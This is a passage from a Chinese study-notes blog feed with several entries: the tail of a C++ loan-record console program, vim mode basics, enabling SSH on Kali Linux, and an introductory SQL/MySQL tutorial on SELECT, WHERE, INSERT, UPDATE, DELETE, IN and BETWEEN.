&lt;&lt; <span class="string">&quot;信息写入成功！&quot;</span> &lt;&lt; endl;</span><br><span class="line">datafile.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">getfile</span>();</span><br><span class="line"><span class="comment">//for(i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//hr();</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;贷款编号：&quot;&lt;&lt;s[i].id&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;贷款人身份证：&quot;&lt;&lt;s[i].card&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;贷款人姓名：&quot;&lt;&lt;s[i].name&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;贷款人金额：&quot;&lt;&lt;s[i].price&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;贷款人年限：&quot;&lt;&lt;s[i].year&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//for(j=0;j&lt;s[i].n;j++)&#123;</span></span><br><span class="line"><span class="comment">//hr();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;还款编号：&quot;&lt;&lt;s[i].h[j].id&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;还款人身份证：&quot;&lt;&lt;s[i].h[j].card&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;还款人姓名：&quot;&lt;&lt;s[i].h[j].name&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;还款金额：&quot;&lt;&lt;s[i].h[j].price&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;还款的贷款编号：&quot;&lt;&lt;s[i].h[j].did&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">int</span> key;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">menu</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入指令&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; key;</span><br><span class="line"><span class="keyword">if</span> (key == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">task1</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (key == <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">task2</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (key == <span class="number">3</span>) &#123;</span><br><span class="line"><span class="built_in">task3</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (key == <span class="number">4</span>) &#123;</span><br><span class="line"><span class="built_in">task4</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (key == <span class="number">5</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;输入有误！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">inputfile</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="说点别的"><a href="#说点别的" class="headerlink" title="说点别的"></a>说点别的</h3><p>我其实也很纠结应该大力发展哪个语言，目前趋势还是C++吧，毕竟是初见，java面向对象的写法确实舒服，C++要求比较多，matlab确实是目前比较熟悉的语言，python方便但是库很多难以掌握，先学完js和php再看吧</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim学习笔记</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/vim%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/vim%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="vi-vim"><a href="#vi-vim" class="headerlink" title="vi/vim"></a>vi/vim</h3><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/vi-vim-cheat-sheet-sch.gif" alt="img"></p><h3 id="vi-vim-的使用"><a href="#vi-vim-的使用" class="headerlink" title="vi/vim 的使用"></a>vi/vim 的使用</h3><p>基本上 vi/vim 共分为三种模式，分别是<strong>命令模式（Command mode）</strong>，<strong>输入模式（Insert mode）</strong>和<strong>底线命令模式（Last line mode）</strong>。 这三种模式的作用分别是：</p><h3 id="命令模式："><a href="#命令模式：" class="headerlink" title="命令模式："></a>命令模式：</h3><p>用户刚刚启动 vi/vim，便进入了命令模式。</p><p>此状态下敲击键盘动作会被Vim识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。</p><p>以下是常用的几个命令：</p><ul><li><strong>i</strong> 切换到输入模式，以输入字符。</li><li><strong>x</strong> 删除当前光标所在处的字符。</li><li><strong>:</strong> 切换到底线命令模式，以在最底一行输入命令。</li><li>/后面跟上搜索的字符串，回车搜索，n和N上下移动搜索目标</li></ul><p>若想要编辑文本：启动Vim，进入了命令模式，按下i，切换到输入模式。</p><p>命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令。</p><h3 id="输入模式"><a href="#输入模式" class="headerlink" title="输入模式"></a>输入模式</h3><p>在命令模式下按下i就进入了输入模式。</p><p>在输入模式中，可以使用以下按键：</p><ul><li><strong>字符按键以及Shift组合</strong>，输入字符</li><li><strong>ENTER</strong>，回车键，换行</li><li><strong>BACK SPACE</strong>，退格键，删除光标前一个字符</li><li><strong>DEL</strong>，删除键，删除光标后一个字符</li><li><strong>方向键</strong>，在文本中移动光标</li><li><strong>HOME</strong>/<strong>END</strong>，移动光标到行首/行尾</li><li><strong>Page Up</strong>/<strong>Page Down</strong>，上/下翻页</li><li><strong>Insert</strong>，切换光标为输入/替换模式，光标将变成竖线/下划线</li><li><strong>ESC</strong>，退出输入模式，切换到命令模式</li></ul><h3 id="底线命令模式"><a href="#底线命令模式" class="headerlink" title="底线命令模式"></a>底线命令模式</h3><p>在命令模式下按下:（英文冒号）就进入了底线命令模式。</p><p>底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。</p><p>在底线命令模式中，基本的命令有（已经省略了冒号）：</p><ul><li>q 退出程序</li><li>w 保存文件</li></ul><p>按ESC键可随时退出底线命令模式。</p><p>简单的说，我们可以将这三个模式想成底下的图标来表示：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/vim-vi-workmodel.png" alt="img"></p><h2 id="kali开启ssh"><a href="#kali开启ssh" class="headerlink" title="kali开启ssh"></a>kali开启ssh</h2><p>使用vm桥接模式启用kali-live时，使用bitvise连接kali出现10061目标主机积极拒绝错误，遇到的情况是ssh未开启导致。</p><p>更新源，/etc/apt/sources.list</p><p>一般自带ssh，如果没有，安装，sudo apt-get install openssh-server</p><p>ps -e|grep ssh 判断ssh是否开启，如开启，则有sshd字样</p><p>如未开启，/etc/init.d/ssh start 命令开启</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL-Mysql笔记</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL-Mysql%E7%AC%94%E8%AE%B0/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL-Mysql%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h1><h2 id="SQL简介"><a href="#SQL简介" class="headerlink" title="SQL简介"></a>SQL简介</h2><h3 id="SQL是什么"><a href="#SQL是什么" class="headerlink" title="SQL是什么"></a>SQL是什么</h3><ul><li><p><strong>SQL</strong> (Structured Query Language:结构化查询语言) ，是一门语言，专门管理数据库的语言。</p></li><li><p>这个语言有若干版本，但是要与ANSI标准兼容（美国国家标准化组织），所以各种版本的SQL必须要用相似的方式执行主要命令，比如<strong>SELECT、UPDATE、DELETE、INSERT、WHERE</strong> 等等</p></li></ul><h3 id="可以操作管理哪些数据库？"><a href="#可以操作管理哪些数据库？" class="headerlink" title="可以操作管理哪些数据库？"></a>可以操作管理哪些数据库？</h3><p> MySQL、SQL Server、Access、Oracle、Sybase、DB2 等等</p><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>增删改查</p><hr><p>一个用到SQL的网站，一般是数据库（RDBMS关系型数据库管理系统）+SQL+脚本语言（php，asp）+前端（html、css）</p><p>教程：<a href="https://www.runoob.com/sql/sql-intro.html">https://www.runoob.com/sql/sql-intro.html</a></p><h2 id="SQL初级"><a href="#SQL初级" class="headerlink" title="SQL初级"></a>SQL初级</h2><h3 id="SQL语法"><a href="#SQL语法" class="headerlink" title="SQL语法"></a>SQL语法</h3><ul><li>SQL 对大小写不敏感。</li><li>某些数据库系统要求在每条 SQL 语句的末端使用分号。分号是在数据库系统中分隔每条 SQL 语句的标准方法，这样就可以在对服务器的同一请求中执行一条以上的 SQL 语句。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">use database_name; 命令用于选择数据库，返回Database changed</span><br><span class="line"><span class="keyword">set</span> names utf8; 命令用于设置使用的字符集。返回Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Websites; 读取数据表的信息。</span><br><span class="line"></span><br><span class="line">重要的<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">-</span> 从数据库中提取数据</span><br><span class="line">UPDATE <span class="operator">-</span> 更新数据库中的数据</span><br><span class="line"><span class="keyword">DELETE</span> <span class="operator">-</span> 从数据库中删除数据</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="operator">-</span> 向数据库中插入新数据</span><br><span class="line"><span class="keyword">CREATE</span> DATABASE <span class="operator">-</span> 创建新数据库</span><br><span class="line"><span class="keyword">ALTER</span> DATABASE <span class="operator">-</span> 修改数据库</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="operator">-</span> 创建新表</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="operator">-</span> 变更（改变）数据库表</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="operator">-</span> 删除表</span><br><span class="line"><span class="keyword">CREATE</span> INDEX <span class="operator">-</span> 创建索引（搜索键）</span><br><span class="line"><span class="keyword">DROP</span> INDEX <span class="operator">-</span> 删除索引</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><ul><li>用于从数据库中选取数据,结果被存储在一个结果表中，称为结果集</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name,column_name <span class="keyword">FROM</span> table_name;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure><ul><li>大多数数据库软件系统都允许使用编程函数在结果集中进行导航，比如：Move-To-First-Record、Get-Record-Content、Move-To-Next-Record 等等</li></ul><blockquote><p><a href="https://www.runoob.com/sql/sql-select.html">https://www.runoob.com/sql/sql-select.html</a></p></blockquote><h3 id="select-distinct"><a href="#select-distinct" class="headerlink" title="select distinct"></a>select distinct</h3><ul><li>在表中，一个列可能会包含多个重复值，有时希望仅仅列出不同（distinct）的值。distinct关键词用于返回唯一不同的值</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> column_name,column_name <span class="keyword">FROM</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> country <span class="keyword">FROM</span> Websites; 表websites中所有contry只显示一遍</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="where子句"><a href="#where子句" class="headerlink" title="where子句"></a>where子句</h3><ul><li>用于过滤提取那些满足指定条件的记录。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name,column_name</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name operator <span class="keyword">value</span>;</span><br><span class="line"></span><br><span class="line">字符串与数字</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tablex <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;xy&#x27;</span>; </span><br><span class="line">字符串单引号包裹</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tablex <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">运算符：<span class="operator">=</span> <span class="operator">&gt;</span> <span class="operator">&lt;</span> <span class="operator">&gt;=</span> ,<span class="operator">&lt;=</span>, <span class="operator">!=</span>,<span class="operator">&lt;&gt;</span> 表示（不等于）</span><br><span class="line"></span><br><span class="line">逻辑运算     优先级()    <span class="keyword">not</span>        <span class="keyword">and</span>         <span class="keyword">or</span></span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> sal <span class="operator">&gt;</span> <span class="number">2000</span> <span class="keyword">and</span> sal <span class="operator">&lt;</span> <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> sal <span class="operator">&gt;</span> <span class="number">2000</span> <span class="keyword">or</span> comm <span class="operator">&gt;</span> <span class="number">500</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> <span class="keyword">not</span> sal <span class="operator">&gt;</span> <span class="number">1500</span>; </span><br><span class="line">查询EMP表中 sal 小于等于 <span class="number">1500</span> 的值。 </span><br><span class="line"></span><br><span class="line">特殊条件</span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> comm <span class="keyword">is</span> <span class="keyword">null</span>;  </span><br><span class="line">查询 emp 表中 comm 列中的空值。 </span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> sal <span class="keyword">between</span> <span class="number">1500</span> <span class="keyword">and</span> <span class="number">3000</span>; </span><br><span class="line">查询 emp 表中 SAL 列中大于 <span class="number">1500</span> 的小于 <span class="number">3000</span> 的值。下限在前，上限在后，闭区间</span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> sal <span class="keyword">in</span> (<span class="number">5000</span>,<span class="number">3000</span>,<span class="number">1500</span>);</span><br><span class="line">等于 <span class="number">5000</span>，<span class="number">3000</span>，<span class="number">1500</span> 的值。</span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> ename <span class="keyword">like</span> <span class="string">&#x27;M%&#x27;</span>;</span><br><span class="line">查询 EMP 表中 Ename 列中有 M 的值，M 为要查询内容中的模糊信息。</span><br><span class="line"></span><br><span class="line">不带比较运算符的<span class="keyword">where</span>子句</span><br><span class="line">当不带运算符时，会执行一个隐式转换。当 <span class="number">0</span> 时转化为 <span class="literal">false</span>，<span class="number">1</span> 转化为 <span class="literal">true</span>。</span><br><span class="line"><span class="keyword">SELECT</span> studentNO <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> <span class="number">0</span>; </span><br><span class="line">则会返回一个空集，因为每一行记录 <span class="keyword">WHERE</span> 都返回 <span class="literal">false</span>。</span><br><span class="line"><span class="keyword">SELECT</span>  studentNO  <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> <span class="number">1</span>;</span><br><span class="line">返回 student 表所有行中 studentNO 列的值。因为每一行记录 <span class="keyword">WHERE</span> 都返回 <span class="literal">true</span>。</span><br></pre></td></tr></table></figure><h3 id="and-amp-or"><a href="#and-amp-or" class="headerlink" title="and &amp; or"></a>and &amp; or</h3><ul><li>用于基于一个以上的条件对记录进行过滤</li><li>and 需要都成立，or只需一个成立即可</li><li>可以把 AND 和 OR 结合起来（使用圆括号来组成复杂的表达式）</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> country<span class="operator">=</span><span class="string">&#x27;CN&#x27;</span> <span class="keyword">AND</span> alexa <span class="operator">&gt;</span> <span class="number">50</span>;</span><br><span class="line">从 &quot;Websites&quot; 表中选取国家为 &quot;CN&quot; 且alexa排名大于 &quot;50&quot; 的所有网站：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> country<span class="operator">=</span><span class="string">&#x27;USA&#x27;</span> <span class="keyword">OR</span> country<span class="operator">=</span><span class="string">&#x27;CN&#x27;</span>;</span><br><span class="line">从 &quot;Websites&quot; 表中选取国家为 &quot;USA&quot; 或者 &quot;CN&quot; 的所有客户</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> alexa <span class="operator">&gt;</span> <span class="number">15</span> <span class="keyword">AND</span> (country<span class="operator">=</span><span class="string">&#x27;CN&#x27;</span> <span class="keyword">OR</span> country<span class="operator">=</span><span class="string">&#x27;USA&#x27;</span>);</span><br><span class="line">从 &quot;Websites&quot; 表中选取 alexa 排名大于 &quot;15&quot; 且国家为 &quot;CN&quot; 或 &quot;USA&quot; 的所有网站：</span><br></pre></td></tr></table></figure><h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><ul><li><p>对结果集按照一个列或者多个列进行排序。</p></li><li><p>默认按照升序对记录进行排序。如果需要按照降序对记录进行排序，可以使用 DESC 关键字</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name,column_name <span class="keyword">FROM</span> table_name <span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name,column_name <span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.runoob.com/sql/sql-orderby.html">https://www.runoob.com/sql/sql-orderby.html</a></p></blockquote><h3 id="insert-into"><a href="#insert-into" class="headerlink" title="insert into"></a>insert into</h3><ul><li>用于向表中插入新记录。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name <span class="keyword">VALUES</span> (value1,value2,value3,...);</span><br><span class="line">直接插</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (column1,column2,column3,...) <span class="keyword">VALUES</span> (value1,value2,value3,...);</span><br><span class="line">指定列名再插</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Websites (name, url, alexa, country) <span class="keyword">VALUES</span> (<span class="string">&#x27;百度&#x27;</span>,<span class="string">&#x27;https://www.baidu.com/&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;CN&#x27;</span>);</span><br><span class="line">向 &quot;Websites&quot; 表中插入一个新行，需要列出插入行的每一列数据:，id列一般是自动更新的，表中的每条记录都有一个唯一的数字。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Websites (name, url, country) <span class="keyword">VALUES</span> (<span class="string">&#x27;stackoverflow&#x27;</span>, <span class="string">&#x27;http://stackoverflow.com/&#x27;</span>, <span class="string">&#x27;IND&#x27;</span>);</span><br><span class="line">只在 &quot;name&quot;、&quot;url&quot; 和 &quot;country&quot; 列插入数据（id 字段会自动更新）</span><br><span class="line"></span><br><span class="line">拓展：<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">select</span> 和<span class="keyword">select</span> <span class="keyword">into</span> <span class="keyword">from</span> 的区别</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> scorebak <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> socre <span class="keyword">where</span> neza<span class="operator">=</span><span class="string">&#x27;neza&#x27;</span>   <span class="comment">--插入一行,要求表scorebak 必须存在</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span>  <span class="keyword">into</span> scorebak <span class="keyword">from</span> score  <span class="keyword">where</span> neza<span class="operator">=</span><span class="string">&#x27;neza&#x27;</span>  <span class="comment">--也是插入一行,要求表scorebak 不存在</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><ul><li>用于更新表中已存在的记录。</li><li>执行没有 WHERE 子句的 UPDATE 要慎重，再慎重。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name <span class="keyword">SET</span> column1<span class="operator">=</span>value1,column2<span class="operator">=</span>value2,... <span class="keyword">WHERE</span> some_column<span class="operator">=</span>some_value;</span><br><span class="line">此处注意<span class="keyword">WHERE</span> 子句规定哪条记录或者哪些记录需要更新。如果省略了 <span class="keyword">WHERE</span> 子句，所有的记录都将被更新！</span><br><span class="line"></span><br><span class="line">UPDATE table1 <span class="keyword">SET</span> data<span class="operator">=</span><span class="string">&#x27;5000&#x27;</span>, country<span class="operator">=</span><span class="string">&#x27;CN&#x27;</span> <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;xiaoyao&#x27;</span>;</span><br><span class="line"></span><br><span class="line">在 MySQL 中可以通过设置 sql_safe_updates 这个自带的参数来解决，当该参数开启的情况下，你必须在update 语句后携带 <span class="keyword">where</span> 条件，否则就会报错</span><br><span class="line"><span class="keyword">set</span> sql_safe_updates<span class="operator">=</span><span class="number">1</span>; 表示开启该参数</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><ul><li>用于删除表中的行。</li><li>如果省略了 WHERE 子句，所有的记录都将被删除！</li><li>可以在不删除表的情况下，删除表中所有的行。这意味着表结构、属性、索引将保持不变</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> some_column<span class="operator">=</span>some_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;Facebook&#x27;</span> <span class="keyword">AND</span> country<span class="operator">=</span><span class="string">&#x27;USA&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name;或<span class="keyword">DELETE</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name;</span><br><span class="line">不删除表的情况下，删除表中所有的行</span><br></pre></td></tr></table></figure><h2 id="SQL高级"><a href="#SQL高级" class="headerlink" title="SQL高级"></a>SQL高级</h2><h3 id="in"><a href="#in" class="headerlink" title="in"></a>in</h3><ul><li>在 WHERE 子句中规定多个值</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> column_name <span class="keyword">IN</span> (value1,value2,...);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> vector <span class="keyword">WHERE</span> name <span class="keyword">IN</span> (<span class="string">&#x27;xiaoyao&#x27;</span>,<span class="string">&#x27;逍遥&#x27;</span>); </span><br><span class="line">从vector表中选取name为xiaoyao或“逍遥”的所有获奖者</span><br></pre></td></tr></table></figure><h3 id="between"><a href="#between" class="headerlink" title="between"></a>between</h3><ul><li>选取介于两个值之间的数据范围内的值。这些值可以是数值、文本或者日期。</li><li>注意，不同数据库between左右区间开闭不同</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> column_name <span class="keyword">BETWEEN</span> value1 <span class="keyword">AND</span> value2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> alexa <span class="keyword">BETWEEN</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">20</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> alexa <span class="keyword">NOT</span> <span class="keyword">BETWEEN</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">20</span>; </span><br><span class="line">不在 <span class="keyword">not</span> <span class="keyword">between</span></span><br></pre></td></tr></table></figure><ul><li>带有in的between</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> (alexa <span class="keyword">BETWEEN</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">20</span>) <span class="keyword">AND</span> country <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;USA&#x27;</span>, <span class="string">&#x27;IND&#x27;</span>); </span><br></pre></td></tr></table></figure><ul><li>带有文本值的between</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Websites <span 